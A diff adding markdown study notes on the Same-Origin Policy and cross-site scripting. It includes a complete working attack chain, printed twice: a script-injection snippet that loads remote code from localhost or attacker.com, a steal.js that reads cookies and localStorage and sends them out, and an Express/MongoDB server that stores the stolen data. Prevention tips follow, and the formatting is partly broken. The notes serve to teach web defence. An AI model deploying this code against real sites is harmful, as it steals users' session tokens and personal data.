@@ -1730,3 +1730,425 @@ Without SOP, evil.com could:
 > CORS enables developers  
 
 Both together make the web secure AND usable
+
+
+
+
+# 🚨 XSS Attack Demo (Client + Attacker Server)
+
+## 📖 Overview
+
+This demonstrates how a **Cross-Site Scripting (XSS)** attack works:
+
+1. Attacker injects a script into a vulnerable website  
+2. That script loads a malicious JS file  
+3. Malicious JS steals user data (cookies + localStorage)  
+4. Data is sent to attacker’s server  
+5. Attacker stores the stolen data  
+
+---
+
+# 🧠 Part 1: Injected Script (Client-side)
+
+```js
+const s = document.createElement("script");
+s.src = "http://localhost:8000/steal.js";
+document.body.appendChild(s);
+🔍 What this does
+
+Dynamically creates a <script> tag
+
+Loads external JS from attacker server
+
+Executes it inside victim’s browser
+
+Equivalent to:
+
+<script src="http://localhost:8000/steal.js"></script>
+⚠️ Why this is dangerous
+
+Browser trusts this script (runs in your site's context)
+
+It can access:
+
+cookies 🍪
+
+localStorage 📦
+
+DOM 🧾
+
+🧠 Part 2: Malicious Script (steal.js)
+async function stealData() {
+  const cookies = document.cookie
+    ? Object.fromEntries(document.cookie.split("; ").map((c) => c.split("=")))
+    : {};
+
+  const localStorageData = {};
+  for (let i = 0; i < localStorage.length; i++) {
+    const key = localStorage.key(i);
+    localStorageData[key] = localStorage.getItem(key);
+  }
+
+  if (Object.keys(cookies).length || Object.keys(localStorageData).length) {
+    const response = await fetch("http://localhost:8000/victim", {
+      method: "POST",
+      body: JSON.stringify({ cookies, localStorage: localStorageData }),
+      headers: {
+        "Content-Type": "application/json",
+      },
+    });
+
+    const data = await response.json();
+    console.log(data);
+  } else {
+    console.log("Could not steal anything. Your website is very secure.");
+  }
+}
+
+stealData();
+🔍 What this script does
+1. 🍪 Reads cookies
+document.cookie
+
+Converts:
+
+token=abc123; user=jeff
+
+Into:
+
+{
+  token: "abc123",
+  user: "jeff"
+}
+2. 📦 Reads localStorage
+localStorage.getItem(key)
+
+Collects:
+
+{
+  token: "jwt_token",
+  user: "jeff"
+}
+3. 🚀 Sends data to attacker
+fetch("http://localhost:8000/victim", {...})
+
+👉 Sends stolen data to attacker server
+
+🧠 Part 3: Attacker Server (Express + MongoDB)
+import express from "express";
+import mongoose from "mongoose";
+import cors from "cors";
+
+const app = express();
+
+app.use(cors());
+app.use(express.json());
+
+await mongoose.connect(
+  "mongodb://admin:admin@localhost/xssAttackData?authSource=admin"
+);
+
+const victimSchema = new mongoose.Schema({
+  cookies: {},
+  localStorage: {},
+  website: String,
+});
+
+const Victim = mongoose.model("victim", victimSchema);
+
+// Serve malicious files (like steal.js)
+app.use(express.static("./public"));
+
+app.post("/victim", async (req, res) => {
+  const { cookies, localStorage } = req.body;
+
+  console.log(req.body);
+
+  const victim = await Victim.create({
+    localStorage: localStorage,
+    cookies: cookies,
+    website: req.headers.origin,
+  });
+
+  return res
+    .status(201)
+    .json({ message: "Stolen all this data.", data: victim });
+});
+
+app.listen(8000, () =>
+  console.log("Server running on http://localhost:8000")
+);
+🔍 What this server does
+1. 📂 Serves malicious script
+app.use(express.static("./public"));
+
+👉 Makes steal.js available at:
+
+http://localhost:8000/steal.js
+2. 📥 Receives stolen data
+app.post("/victim", ...)
+
+👉 Receives:
+
+{
+  "cookies": {...},
+  "localStorage": {...}
+}
+3. 💾 Stores stolen data
+await Victim.create({...})
+
+👉 Saves into MongoDB
+
+4. 🌐 Tracks victim site
+website: req.headers.origin
+
+👉 Records which website was attacked
+
+💥 Full Attack Flow
+Attacker injects script
+        ↓
+Victim loads webpage
+        ↓
+Browser loads steal.js from attacker server
+        ↓
+steal.js reads cookies + localStorage
+        ↓
+Sends data to /victim
+        ↓
+Server stores stolen data in MongoDB
+⚠️ Why this works
+
+Script runs inside victim’s site (trusted context)
+
+Browser allows access to:
+
+cookies (unless httpOnly)
+
+localStorage
+
+SOP does NOT stop this (same-origin execution)
+
+🔐 How to Prevent This
+✅ 1. Use HTTP-only cookies
+res.cookie("token", token, {
+  httpOnly: true,
+});
+✅ 2. Avoid innerHTML
+// ❌ unsafe
+div.innerHTML = userInput;
+
+// ✅ safe
+div.textContent = userInput;
+✅ 3. Use React safely
+<p>{userInput}</p> // auto-escaped
+❌ Avoid
+dangerouslySetInnerHTML={{ __html: userInput }}
+✅ 4. Content Security Policy (CSP)
+Content-Security-Policy: script-src 'self'
+
+👉 Blocks external scripts
+
+🧩 Key Takeaway
+
+XSS allows attackers to run JavaScript inside your website
+→ which lets them steal user data
+
+🚀 TL;DR
+
+Inject script → load malicious JS
+
+JS steals cookies + localStorage
+
+Sends data to attacker server
+
+Server stores everything
+
+👉 Protect by:
+
+validating input
+
+avoiding raw HTML rendering
+
+using httpOnly cookies
+
+applying CSP
+
+
+---
+
+If you want next, I can:
+👉 show how to **simulate this attack on your own MERN app safely**  
+👉 or help you **secure your auth system against XSS completely** 🔐
+
+
+
+
+
+# 🛡️ Complete Web Security Notes (SOP + XSS + Script Injection + onerror)
+
+---
+
+# 🌐 1. Same-Origin Policy (SOP)
+
+## 📖 What is SOP?
+
+Same-Origin Policy is a **browser security rule** that prevents one website from reading sensitive data from another website.
+
+> 👉 Origin = protocol + domain + port
+
+---
+
+## 🧠 Examples
+
+### ❌ Different Origin
+
+http://localhost:3000  
+http://localhost:4000  
+
+👉 Different port → NOT same origin
+
+---
+
+### ✅ Same Origin
+
+https://example.com  
+https://example.com/page  
+
+👉 Path doesn’t matter → SAME origin
+
+---
+
+## 🔐 What SOP Prevents
+
+- ❌ Reading API responses from other sites  
+- ❌ Accessing cookies from another domain  
+- ❌ Accessing DOM of another site  
+- ❌ Reading localStorage/sessionStorage  
+
+---
+
+## ⚠️ Important
+
+👉 SOP **allows sending requests**  
+👉 SOP **blocks reading responses**
+
+---
+
+# 🚨 2. What is XSS (Cross-Site Scripting)
+
+## 📖 Definition
+
+XSS is when an attacker injects **malicious JavaScript into your website**, which runs in other users’ browsers.
+
+---
+
+## 💥 Example
+
+```html
+<script>alert("Hacked")</script>
+
+
+⚔️ 3. XSS Attack Flow
+
+Attacker injects input
+↓
+Website renders it unsafely
+↓
+Browser executes malicious JS
+↓
+JS steals cookies/localStorage
+↓
+Sends data to attacker
+
+🧪 4. Script Injection (Dynamic Script Tag)
+📌 Code
+const s = document.createElement("script");
+s.src = "http://attacker.com/steal.js";
+document.body.appendChild(s);
+🧠 What happens
+
+Creates <script> tag
+
+Loads external JS
+
+Runs inside your site
+
+Equivalent to:
+
+<script src="http://attacker.com/steal.js"></script>
+🧪 5. Malicious Script (steal.js)
+📌 Code
+async function stealData() {
+  const cookies = document.cookie
+    ? Object.fromEntries(document.cookie.split("; ").map((c) => c.split("=")))
+    : {};
+
+  const localStorageData = {};
+  for (let i = 0; i < localStorage.length; i++) {
+    const key = localStorage.key(i);
+    localStorageData[key] = localStorage.getItem(key);
+  }
+
+  await fetch("http://localhost:8000/victim", {
+    method: "POST",
+    body: JSON.stringify({ cookies, localStorage: localStorageData }),
+    headers: {
+      "Content-Type": "application/json",
+    },
+  });
+}
+
+stealData();
+🔍 What this does
+🍪 Step 1: Reads cookies
+document.cookie
+📦 Step 2: Reads localStorage
+localStorage.getItem(key)
+📡 Step 3: Sends data to attacker
+fetch("http://localhost:8000/victim", ...)
+🖥️ 6. Attacker Server (Express + MongoDB)
+📌 Code
+import express from "express";
+import mongoose from "mongoose";
+import cors from "cors";
+
+const app = express();
+
+app.use(cors());
+app.use(express.json());
+
+await mongoose.connect(
+  "mongodb://admin:admin@localhost/xssAttackData?authSource=admin"
+);
+
+const victimSchema = new mongoose.Schema({
+  cookies: {},
+  localStorage: {},
+  website: String,
+});
+
+const Victim = mongoose.model("victim", victimSchema);
+
+// Serve malicious JS
+app.use(express.static("./public"));
+
+app.post("/victim", async (req, res) => {
+  const { cookies, localStorage } = req.body;
+
+  const victim = await Victim.create({
+    localStorage,
+    cookies,
+    website: req.headers.origin,
+  });
+
+  res.status(201).json({ message: "Data stored", data: victim });
+});
+
+app.listen(8000, () => console.log("Server running"));
+🧠 What this server does
+
+Serves malicious file (steal.js)
+
+Receives stolen data
+
+Stores it in MongoDB
